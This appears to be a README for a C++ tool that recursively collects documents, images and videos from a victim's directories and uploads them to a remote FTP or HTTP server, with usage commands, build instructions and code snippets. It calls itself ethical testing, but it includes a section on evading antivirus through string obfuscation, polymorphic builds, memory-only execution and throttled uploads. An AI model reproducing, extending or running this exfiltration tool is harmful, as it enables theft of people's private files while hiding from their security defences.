## Introduction

The File Exfiltration Tool is a command-line utility designed for ethically testing file exfiltration techniques. It identifies and uploads relevant files from a specified directory to a remote server using either **FTP** or **HTTP** protocols. 

---

## Features

- **Recursive Directory Traversal**: Searches all subdirectories for target files.
- **File Filtering**: Uploads only specific file types such as `.pdf`, `.jpg`, `.txt`, etc.
- **Protocol Support**: Choose between FTP or HTTP for uploading files.
- **Error Logging**: Comprehensive logging for skipped files and errors.
- **Easy Configuration**: Customize parameters via command-line arguments.

---

## How It Works

1. **File Identification**: Filters files based on predefined extensions.
2. **Directory Traversal**: Uses `std::filesystem::recursive_directory_iterator` to search directories.
3. **File Upload**: Uploads identified files to the specified server using the selected protocol.
4. **Error Handling**: Graceful handling of invalid paths, network issues, and unsupported file types.

## Usage Instructions

### Syntax
```bash
tool.exe <ftp|http> <username> <password> <server> <localPath> <remotePath>
Parameters
<ftp|http>: Specifies the upload mode.
<username>: The username for server authentication.
<password>: The password for server authentication.
<server>: The IP or hostname of the remote server.
<localPath>: The local directory to scan for files.
<remotePath>: The target directory on the remote server.
Examples
FTP Mode
bash
tool.exe ftp user123 pass123 ftp.example.com C:\Users\User\Documents /uploads
HTTP Mode
bash
tool.exe http user123 pass123 http://192.168.1.1 C:\Files /uploads
File Upload Modes
FTP Upload
Establishes an FTP connection with the given credentials.
Uploads files to the specified remote directory.
HTTP Upload
Sends files as HTTP POST requests.
Compatible with servers configured for HTTP uploads.
Compilation
To compile the program, use the following command:

bash
g++ -static-libgcc -static-libstdc++ -O2 -o file_exfiltrator.exe main.cpp FtpUploader.cpp HttpUploader.cpp Utils.cpp -lwininet -lshlwapi
This command ensures the program is compiled with all dependencies statically linked, making it portable.

Bypassing Antivirus
To minimize detection by antivirus systems, the tool incorporates the following evasion techniques:

String Obfuscation: Obfuscates sensitive strings such as file extensions and URLs.
Polymorphic Compilation: Introduces minor variations in the binary structure during each compilation.
Memory-Only Execution: Avoids writing to disk to reduce the on-disk footprint.
Behavioral Evasion:
Utilizes native Windows APIs to mimic legitimate processes.
Limits upload speed to avoid triggering behavioral analysis.
Code Architecture
Key Components
File Type Detection:

isRelevantFileType: Identifies files based on their extensions.
Exfiltration Logic:

exfiltrateRelevantFiles: Handles directory traversal and uploads files using the appropriate protocol.
Protocol Handlers:

FtpUploader: Contains the logic for FTP communication.
HttpUploader: Handles HTTP POST requests.
Utilities:

Utils.h: Helper functions for string manipulation and logging.
Example Code Snippets
File Filtering
cpp
bool isRelevantFileType(const std::string& filePath) {
    static const std::vector<std::string> relevantExtensions = {
        ".pdf", ".img", ".png", ".jpg", ".jpeg", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".mp4", ".avi"
    };

    std::string extension = fs::path(filePath).extension().string();
    return std::find(relevantExtensions.begin(), relevantExtensions.end(), extension) != relevantExtensions.end();
}
Directory Traversal
cpp
for (const auto& entry : fs::recursive_directory_iterator(startPath)) {
    if (entry.is_regular_file() && isRelevantFileType(entry.path().string())) {
        uploadFTP(username, password, server, entry.path().string(), remotePath, {});
    }
}
